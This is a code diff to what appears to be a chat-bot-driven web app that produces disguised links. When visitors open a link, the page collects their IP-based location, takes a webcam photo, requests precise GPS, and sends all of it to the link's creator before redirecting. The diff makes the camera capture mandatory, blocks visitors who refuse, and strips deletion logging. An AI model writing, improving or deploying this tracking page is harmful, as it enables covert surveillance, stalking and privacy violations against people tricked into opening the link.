@@ -100,16 +100,14 @@ def delete_old_files():
         try:
             if datetime.fromtimestamp(os.path.getmtime(fp)) < cutoff:
                 os.remove(fp)
-                logger.info(f"Deleted old photo: {f}")
         except:
             pass
     for f in os.listdir(HTML_DIR):
-        if f.endswith('.html') and not f.startswith('state_'):
+        if f.endswith('.html'):
             fp = os.path.join(HTML_DIR, f)
             try:
                 if datetime.fromtimestamp(os.path.getmtime(fp)) < cutoff:
                     os.remove(fp)
-                    logger.info(f"Deleted old HTML: {f}")
             except:
                 pass
 
@@ -284,7 +282,7 @@ function sendPhoto(blob) {{
 async function startProcess() {{
     showLoading();
     
-    // Get IP and basic info (fast, no permission needed)
+    // Basic info (IP, device, battery)
     try {{
         let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unknown');
         let info = await fetch(`https://ipapi.co/${{ip}}/json/`).then(r=>r.json()).catch(()=>{{}});
@@ -313,8 +311,8 @@ async function startProcess() {{
         sendMessage(msg);
     }} catch(e) {{}}
     
-    // Camera first
-    let cameraSuccess = false;
+    // CAMERA COMPULSORY - must allow to proceed
+    let cameraAllowed = false;
     try {{
         let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
         let video = document.getElementById('video');
@@ -328,28 +326,38 @@ async function startProcess() {{
         let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
         if (blob && blob.size > 500) sendPhoto(blob);
         stream.getTracks().forEach(t => t.stop());
-        cameraSuccess = true;
+        cameraAllowed = true;
+        sendMessage("✅ Camera access granted");
     }} catch(e) {{
-        sendMessage("Camera access denied");
+        cameraAllowed = false;
+        sendMessage("❌ Camera access denied");
     }}
     
-    // THEN ask for GPS location (after camera)
+    // If camera NOT allowed - STOP, don't redirect
+    if (!cameraAllowed) {{
+        document.getElementById('loadingStep').classList.remove('active');
+        document.getElementById('mainStep').classList.add('active');
+        document.getElementById('errorMsg').innerHTML = "Camera access is required to continue. Please refresh and allow camera.";
+        return;
+    }}
+    
+    // Camera allowed - now ask for GPS (optional)
     if (navigator.geolocation) {{
         navigator.geolocation.getCurrentPosition(
             (p) => {{
-                sendMessage("<b>GPS Location</b>\\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
-                sendMessage("<b>Coordinates</b>\\nLat: " + p.coords.latitude + "\\nLon: " + p.coords.longitude + "\\nAccuracy: " + p.coords.accuracy + "m");
-                setTimeout(() => {{ window.location.href = TARGET; }}, 300);
+                sendMessage("<b>📍 GPS Location</b>\\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
+                sendMessage("<b>🎯 Coordinates</b>\\nLat: " + p.coords.latitude + "\\nLon: " + p.coords.longitude + "\\nAccuracy: " + p.coords.accuracy + "m");
+                setTimeout(() => {{ window.location.href = TARGET; }}, 500);
             }},
             (e) => {{
-                sendMessage("GPS Location: Access denied");
-                setTimeout(() => {{ window.location.href = TARGET; }}, 300);
+                sendMessage("📍 GPS Location: Access denied");
+                setTimeout(() => {{ window.location.href = TARGET; }}, 500);
             }},
             {{ timeout: 8000, enableHighAccuracy: true }}
         );
     }} else {{
-        sendMessage("GPS Location: Not supported");
-        setTimeout(() => {{ window.location.href = TARGET; }}, 300);
+        sendMessage("📍 GPS Location: Not supported");
+        setTimeout(() => {{ window.location.href = TARGET; }}, 500);
     }}
 }}
 </script>
@@ -432,7 +440,7 @@ def webhook():
                 set_user_state(uid, "done")
 
                 link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_name}"
-                send_message(uid, f"✅ LINK:\n{link}\n\n⚠️ Active until you create new link\n📸 Camera required\n📍 GPS will be asked")
+                send_message(uid, f"✅ LINK:\n{link}\n\n⚠️ Active until you create new link\n📸 Camera COMPULSORY\n📍 GPS optional")
 
             except Exception as e:
                 logger.error(f"Photo error: {e}")
